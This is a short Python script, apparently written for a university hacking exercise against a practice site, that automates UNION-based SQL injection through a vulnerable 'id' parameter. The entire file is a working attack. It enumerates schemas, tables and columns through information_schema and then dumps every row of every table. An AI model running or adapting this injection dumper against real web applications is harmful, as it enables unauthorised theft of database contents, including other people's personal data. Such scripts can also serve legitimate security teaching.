from pwn import log
import requests
import re

URL = "http://hackme.mimuw.edu.pl/test.php?id=1'" \
      " UNION ALL SELECT NULL,({0}),NULL,NULL,NULL,NULL,NULL--%20"

def hack(statement, p):
    x = URL.format(statement)
    response = requests.get(x)
    m = re.match("Imie: Jan<br>Imie: (.*)<br>", response.content)
    return m.group(1)

def hack_x(statement, p):
    data = []
    for x in range(0, 10):
        try:
            item = hack(statement.format(str(x)), p)
            if item == '':
                break
            data.append(item)
        except:
            break
    return data

def get_databases(p):
    statement = "SELECT schema_name FROM information_schema.schemata " \
                           "LIMIT 1 OFFSET {0}"
    dbs = hack_x(statement, p)
    return dbs


def get_database_tables(db, p):
    statement = "SELECT table_name FROM information_schema.tables " \
                " WHERE table_schema = '" + db + "' LIMIT 1 OFFSET {0}"
    return hack_x(statement, p)

def get_table_columns(database, table, p):
    statement = "SELECT column_name FROM information_schema.columns " \
                "WHERE table_schema = '" + database + \
                "' AND table_name = '" + table + "' LIMIT 1 OFFSET {0}"
    return hack_x(statement, p)

def get_table_data(database, table, columns, p):
    statement = "SELECT CONCAT(COALESCE(" + \
            ", '') ,',', COALESCE(".join(columns) \
            + ", '')) FROM " + database + "." \
            + table + " LIMIT 1 OFFSET {0}"
    return hack_x(statement, p)


if __name__ == "__main__":
    p = log.progress("Fetching databases")
    dbs = get_databases(p)
    p.success()

    p = log.progress("Fetching database tables")
    tables = {}
    for db in dbs:
        tables[db] = get_database_tables(db, p)
    p.success()

    # Don't fetch useless data
    del tables['information_schema']
    log.info("Mark 'information_schema' as useless")

    for db, tables in tables.items():
        p = log.progress("Fetching " + db)
        for table in tables:
            # Fetch columns
            columns = get_table_columns(db, table, p)

            # Fetch records
            records = get_table_data(db, table, columns, p)

            # Print fetched data
            print("DATABASE: " + db + ", TABLE: " + table)
            print(columns)
            for record in records:
                print(record.split(','))
        p.success()

